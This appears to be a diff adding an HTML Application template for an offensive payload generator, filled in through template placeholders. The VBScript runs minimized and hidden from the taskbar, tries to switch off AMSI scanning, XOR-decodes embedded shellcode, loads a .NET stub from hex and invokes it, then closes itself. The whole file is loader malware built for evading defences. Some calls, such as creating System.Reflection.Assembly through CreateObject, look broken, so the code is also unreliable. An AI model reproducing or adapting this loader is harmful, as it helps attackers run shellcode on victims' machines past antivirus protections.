@@ -1,0 +1,64 @@
+<html>
+<head>
+<title>{{ v.title }}</title>
+<HTA:APPLICATION ID="{{ v.app_id }}"
+                 APPLICATIONNAME="{{ v.app_name }}"
+                 BORDER="thin"
+                 BORDERSTYLE="normal"
+                 CAPTION="yes"
+                 SHOWINTASKBAR="no"
+                 SINGLEINSTANCE="yes"
+                 SYSMENU="yes"
+                 WINDOWSTATE="minimize" />
+</head>
+<body>
+<script language="VBScript">
+Sub {{ v.sub_amsi }}()
+    On Error Resume Next
+    Dim asm
+    Set asm = CreateObject("System.Reflection.Assembly")
+    Dim amsi
+    Set amsi = asm.GetType("System.Management.Automation.AmsiUtils")
+    If Not amsi Is Nothing Then
+        amsi.GetField("amsiInitFailed", 36).SetValue Nothing, True
+    End If
+End Sub
+
+Sub {{ v.sub_run }}()
+    Call {{ v.sub_amsi }}()
+
+    Dim sc_hex, key_hex
+    sc_hex  = "{{ shellcode_hex }}"
+    key_hex = "{{ key_hex }}"
+
+    Dim sc()
+    ReDim sc(Len(sc_hex) / 2 - 1)
+    Dim i
+    For i = 0 To Len(sc_hex) / 2 - 1
+        sc(i) = CInt("&H" & Mid(sc_hex, i * 2 + 1, 2)) Xor _
+                CInt("&H" & Mid(key_hex, (i Mod (Len(key_hex) / 2)) * 2 + 1, 2))
+    Next
+
+    ' Load .NET stub and invoke
+    Dim asm, loader
+    Set loader = CreateObject("System.Reflection.Assembly")
+    Dim stub_hex
+    stub_hex = "{{ v.dotnet_stub_hex }}"
+    Dim stub_bytes()
+    ReDim stub_bytes(Len(stub_hex) / 2 - 1)
+    For i = 0 To Len(stub_hex) / 2 - 1
+        stub_bytes(i) = CInt("&H" & Mid(stub_hex, i * 2 + 1, 2))
+    Next
+
+    Set asm = loader.Load((stub_bytes))
+    Dim t, mi
+    Set t  = asm.GetType("Stub.Loader")
+    Set mi = t.GetMethod("Run")
+    mi.Invoke Nothing, Array((sc))
+End Sub
+
+Call {{ v.sub_run }}()
+self.close
+</script>
+</body>
+</html>
